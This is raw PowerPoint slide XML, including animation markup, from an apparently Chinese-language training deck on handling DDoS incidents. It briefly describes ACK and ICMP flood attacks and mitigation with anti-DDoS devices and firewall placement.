                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>psh+ack</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>标志位的包，目标主机直接丢弃，最终导致目标主机性能严重下降。抓包结果如下</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1477" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1007765" y="4031796"/>
            <a:ext cx="6954150" cy="625492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>因为据经验表明，</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>30</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>万</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>pps</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>左右的包，就能使千兆防火墙的负载达到一个比较大的比例。此攻击可能必须使用抗</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>来进行防护，才能达到比较好的效果。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41002957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27651"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27651"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27651"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27651"/>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7650"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="22" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27650"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="276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5" grpId="0"/>
      <p:bldP spid="7"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921" y="2936497"/>
            <a:ext cx="6178794" cy="778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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CBF65E2-07B1-D744-81E0-9ACE251E61C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716802" y="903152"/>
            <a:ext cx="6012473" cy="483031"/>
          </a:xfrm>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>事件处理</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" sz="2585" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="912203" y="1540483"/>
            <a:ext cx="2573486" cy="426093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ICMP-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904140" y="2116581"/>
            <a:ext cx="7049713" cy="625492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>此种攻击为攻击主机向目标主机发送大量</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ICMP</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>请求，目标主机丢弃，大量消耗目标主机资源，达到攻击效果：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="942618" y="4691911"/>
            <a:ext cx="7295797" cy="1189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ts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>此攻击的处理步骤，是将防护目标纳入被保护的范围，然后调节黑洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ACK-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>专业数据同时使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:1)SYN-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>的防护算法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>;2)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DynaCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">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而且要注意，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>在流量较大的情况下，防火墙必须在抗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>后面，否则未经净化的流量有可能会使防火墙的负载大大增高。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="951920" y="3928400"/>
            <a:ext cx="6954150" cy="625492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>因为据经验表明，</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>30</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>万</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>pps</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>左右的包，就能使千兆防火墙的负载达到一个比较大的比例。此攻击可能必须使用抗</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>来进行防护，才能达到比较好的效果。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16149303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anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="15"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0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="22" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="23" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="28675"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="28675"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="28675"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="28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2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1158385" y="5367137"/>
            <a:ext cx="66041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r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">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此攻击的处理思路，是尽量将这些垃圾数据限定在一定流量以下。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2969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2086" y="2745518"/>
            <a:ext cx="6063396" cy="592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8856" y="4202655"/>
            <a:ext cx="6083178" cy="1021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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CBF65E2-07B1-D744-81E0-9ACE251E61C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716802" y="903152"/>
            <a:ext cx="6012473" cy="483031"/>
          </a:xfrm>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>事件处理</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" sz="2585" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
